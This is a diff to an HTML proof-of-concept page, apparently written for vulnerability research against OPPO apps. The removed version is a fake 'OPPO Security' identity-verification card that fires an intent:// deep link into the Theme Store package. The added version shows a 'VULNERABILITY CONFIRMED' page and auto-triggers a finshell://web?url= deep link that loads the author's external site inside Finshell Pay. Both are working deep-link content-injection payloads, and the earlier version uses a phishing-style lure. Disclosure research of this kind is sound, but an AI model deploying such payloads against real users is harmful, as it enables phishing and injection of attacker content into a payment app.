@@ -1,32 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html style="background-color: red; margin: 0; padding: 0;">
 <head>
+    <title>Finshell Security PoC</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; width: 85%; }
-        .btn { display: block; width: 100%; padding: 15px; background: #05ba7d; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; border: none; font-size: 18px; cursor: pointer; }
-    </style>
 </head>
-<body>
+<body style="background-color: red; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; margin: 0;">
 
-<div class="card">
-    <h2 style="color: #05ba7d;">OPPO Security</h2>
-    <p>Identity verification is required. Click the button to continue in the official app.</p>
-    
-    <button onclick="triggerIntent()" class="btn">OPEN IN APP</button>
-    
-    <p style="margin-top: 20px; font-size: 11px; color: #888;">Researcher: yazid47</p>
-</div>
+    <div style="border: 5px solid white; display: inline-block; padding: 20px; border-radius: 15px; width: 85%;">
+        <h1 style="font-size: 30px; margin-bottom: 10px;">VULNERABILITY CONFIRMED</h1>
+        <h2 style="font-size: 20px;">Remote Content Injection</h2>
+        <hr style="border: 1px solid white;">
+        
+        <h3 style="font-size: 18px; background-color: white; color: red; padding: 10px; border-radius: 5px;">
+            Researcher: yazid47
+        </h3>
 
-<script>
-    function triggerIntent() {
-        var intentUrl = "intent://domore/web?url=https://yazidtokyo43.github.io/oppo-tes/#Intent;scheme=oaps;package=com.nearme.themestore;S.browser_fallback_url=https://yazidtokyo43.github.io/oppo-tes/;end";
-        window.location.href = intentUrl;
-    }
-</script>
+        <p style="font-size: 16px; margin-top: 20px;">
+            This red screen proves that I can load <b>external content</b> <br> 
+            inside the official <b>Finshell Pay</b> application.
+        </p>
 
+        <button onclick="openFinshell()" style="padding: 15px 25px; background: white; color: red; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%;">
+            RE-OPEN FINSHELL PAY
+        </button>
+    </div>
+
+    <script>
+        function openFinshell() {
+            // Using the Finshell scheme that worked for you before
+            var finshellUrl = "finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/";
+            window.location.href = finshellUrl;
+        }
+        
+        // Auto-trigger attempt
+        window.onload = function() {
+            setTimeout(function() {
+                openFinshell();
+            }, 1000);
+        };
+    </script>
 </body>
 </html>
